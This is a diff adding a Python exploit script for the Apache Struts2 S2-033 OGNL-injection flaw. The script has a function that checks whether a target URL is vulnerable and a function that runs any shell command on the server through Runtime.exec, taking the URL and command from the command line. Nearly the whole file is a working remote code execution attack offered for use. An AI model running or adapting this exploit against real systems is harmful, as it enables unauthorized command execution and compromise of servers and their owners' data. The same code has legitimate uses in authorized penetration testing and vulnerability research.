@@ -1,0 +1,145 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests
+import random
+import base64
+
+
+upperAlpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+lowerAlpha = "abcdefghijklmnopqrstuvwxyz"
+numerals = "0123456789"
+allchars = [chr(_) for _ in xrange(0x00, 0xFF + 0x01)]
+
+
+def rand_base(length, bad, chars):
+    '''generate a random string with chars collection'''
+    cset = (set(chars) - set(list(bad)))
+    if len(cset) == 0:
+        return ""
+    chars = [list(cset)[random.randrange(len(cset))] for i in xrange(length)]
+    chars = map(str, chars)
+    return "".join(chars)
+
+
+def rand_char(bad='', chars=allchars):
+    '''generate a random char with chars collection'''
+    return rand_base(1, bad, chars)
+
+
+def rand_text(length, bad='', chars=allchars):
+    '''generate a random string (cab be with unprintable chars)'''
+    return rand_base(length, bad, chars)
+
+
+def rand_text_alpha(length, bad=''):
+    '''generate a random string with alpha chars'''
+    chars = upperAlpha + lowerAlpha
+    return rand_base(length, bad, set(chars))
+
+
+def rand_text_alpha_lower(length, bad=''):
+    '''generate a random lower string with alpha chars'''
+    return rand_base(length, bad, set(lowerAlpha))
+
+
+def rand_text_alpha_upper(length, bad=''):
+    '''generate a random upper string with alpha chars'''
+    return rand_base(length, bad, set(upperAlpha))
+
+
+def rand_text_alphanumeric():
+    '''generate a random string with alpha and numerals chars'''
+    chars = upperAlpha + lowerAlpha + numerals
+    return rand_base(length, bad, set(chars))
+
+
+def rand_text_numeric(length, bad=''):
+    '''generate a random string with numerals chars'''
+    return rand_base(length, bad, set(numerals))
+
+
+def generate_rce_payload(code):
+    '''generate apache struts2 s2-033 payload.
+    '''
+    payload = ""
+    payload += requests.utils.quote("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS")
+    payload += ","
+    payload += requests.utils.quote(code)
+    payload += ","
+    payload += requests.utils.quote("#xx.toString.json")
+    payload += "?"
+    payload += requests.utils.quote("#xx:#request.toString")
+    return payload
+
+
+def check(url):
+    '''check if url is vulnerable to apache struts2 S2-033.
+    '''
+    var_a = rand_text_alpha(4)
+    var_b = rand_text_alpha(4)
+    flag = rand_text_alpha(5)
+
+    addend_one = int(rand_text_numeric(2))
+    addend_two = int(rand_text_numeric(2))
+    addend_sum = addend_one + addend_two
+
+    code = "#{var_a}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
+    code += "#{var_a}.print(#parameters.{var_b}[0]),"
+    code += "#{var_a}.print(new java.lang.Integer({addend_one}+{addend_two})),"
+    code += "#{var_a}.print(#parameters.{var_b}[0]),"
+    code += "#{var_a}.close()"
+
+    payload = generate_rce_payload(code.format(
+        var_a=var_a, var_b=var_b, addend_one=addend_one, addend_two=addend_two
+    ))
+
+    url = url + "/" + payload
+    resp = requests.post(url, data={ var_b: flag }, timeout=8)
+
+    vul_flag = "{flag}{addend_sum}{flag}".format(flag=flag, addend_sum=addend_sum)
+    if resp and resp.status_code == 200 and vul_flag in resp.text:
+        return True, resp.text
+
+    return False, ''
+
+
+def exploit(url, cmd):
+    '''exploit url with apache struts2 S2-033.
+    '''
+    var_a = rand_text_alpha(4)
+    var_b = rand_text_alpha(4)   # cmd
+
+    code =  "#{var_a}=new sun.misc.BASE64Decoder(),"
+    # code += "@java.lang.Runtime@getRuntime().exec(new java.lang.String(#{var_a}.decodeBuffer(#parameters.{var_b}[0])))"  # Error 500
+
+    code += "#wr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
+    code += "#rs=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(new java.lang.String(#{var_a}.decodeBuffer(#parameters.{var_b}[0])))),"
+    code += "#wr.println(#rs),#wr.flush(),#wr.close()"
+
+    payload = generate_rce_payload(code.format(
+        var_a=var_a, var_b=var_b
+    ))
+
+    url = url + "/" + payload
+    requests.post(url, data={ var_b: base64.b64encode(cmd) }, timeout=8)
+
+
+
+if __name__ == '__main__':
+    import sys
+
+    if len(sys.argv) != 3:
+        print("[*] python {} <url> <cmd>".format(sys.argv[0]))
+        sys.exit(1)
+
+    url = sys.argv[1]
+    cmd = sys.argv[2]
+
+    print(check(url))
+    exploit(url, cmd)
+
+
+## References
+
+# 1. https://github.com/rapid7/metasploit-framework/pull/6945
